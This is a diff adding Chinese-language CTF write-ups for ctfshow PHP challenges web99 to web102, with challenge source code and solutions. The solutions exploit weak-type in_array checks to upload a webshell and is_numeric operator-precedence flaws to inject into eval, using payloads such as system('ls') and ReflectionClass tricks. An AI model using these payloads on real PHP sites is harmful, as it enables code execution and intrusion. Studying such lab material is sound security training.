@@ -4085,6 +4085,178 @@ if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
 ?>
 ```
 
+这道题首先是创建了一个数组，然后通过循环写入数字（范围0~0x36d）
+
+![image-20241202141710538](assets/image-20241202141710538.png)
+
+接着对传入的n进行判断，判断其是否在数组中，若存在则以n为名字创建一个文件并写入content的内容
+
+我们需要知道的是：
+
+> 在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可),转换之后也就是5,明显是在题目中生成的数组中的
+
+所以我们通过传入content写马后，通过蚁剑连接或者直接命令执行即可得到flag
+
+![image-20241202141941439](assets/image-20241202141941439.png)
+
+#### web100
+
+```php
+<?php
+
+/*
+\# -*- coding: utf-8 -*-
+\# @Author: h1xa
+\# @Date:  2020-09-16 11:25:09
+\# @Last Modified by:  h1xa
+\# @Last Modified time: 2020-09-21 22:10:28
+\# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+  if(!preg_match("/\;/", $v2)){
+    if(preg_match("/\;/", $v3)){
+      eval("$v2('ctfshow')$v3");
+    }
+  }
+  
+}
+
+
+
+?>
+```
+
+这题其实就是一道简单的拼接题
+
+```
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+```
+
+这里看起来像是要求v1，v2，v3都为数字，实际上只需v1为数字则会将v1赋给v0，而不会再执行后面的语句
+
+所以我们这里只需要使v1为数字即可
+
+payload:
+
+```
+?v1=21&v2=var_dump($ctfshow)/*&v3=*/;
+```
+
+或者用命令
+
+```cobol
+?v1=1&v2=system('ls')/*&v3=*/;
+```
+
+![image-20241202145637866](assets/image-20241202145637866.png)
+
+将0x2d更换成-得到flag
+
+#### web101
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-22 00:26:48
+# @link: https://ctfer.com
+
+*/
+
+highlight_file(__FILE__);
+include("ctfshow.php");
+//flag in class ctfshow;
+$ctfshow = new ctfshow();
+$v1=$_GET['v1'];
+$v2=$_GET['v2'];
+$v3=$_GET['v3'];
+$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
+if($v0){
+    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
+        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
+            eval("$v2('ctfshow')$v3");
+        }
+    }
+    
+}
+
+?>
+```
+
+题目描述:修补100题非预期,替换0x2d
+
+修补了上一题通过直接命令执行或者var_dump打印类的方法
+
+我们可以尝试使用反射类的方法，利用题目给出的`('ctfshow')`来拼接打印类
+
+payload:
+
+```
+?v1=1&v2=echo new Reflectionclass&v3=;
+```
+
+![image-20241202152406295](assets/image-20241202152406295.png)
+
+这道题的flag少了一位，在得到的flag在替换掉0x2d后，再进行爆破即可得到flag
+
+pay
+
+```python
+a = "fa2a169a0x2da0820x2d40f30x2da5cd0x2d65ce0d29b42"
+b = a.replace("0x2d","-")
+hex = ["1","2","3","4","5","6","7","8","9","a","b","c","d","e"]
+for i in hex:
+    print("ctfshow{"+b+i+"}")
+```
+
+#### web102
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: atao
+# @Date:   2020-09-16 11:25:09
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-23 20:59:43
+
+*/
+
+
+highlight_file(__FILE__);
+$v1 = $_POST['v1'];
+$v2 = $_GET['v2'];
+$v3 = $_GET['v3'];
+$v4 = is_numeric($v2) and is_numeric($v3);
+if($v4){
+    $s = substr($v2,2);
+    $str = call_user_func($v1,$s);
+    echo $str;
+    file_put_contents($v3,$str);
+}
+else{
+    die('hacker');
+}
+
+
+?>
+```
+
 
 
 ### 反序列化
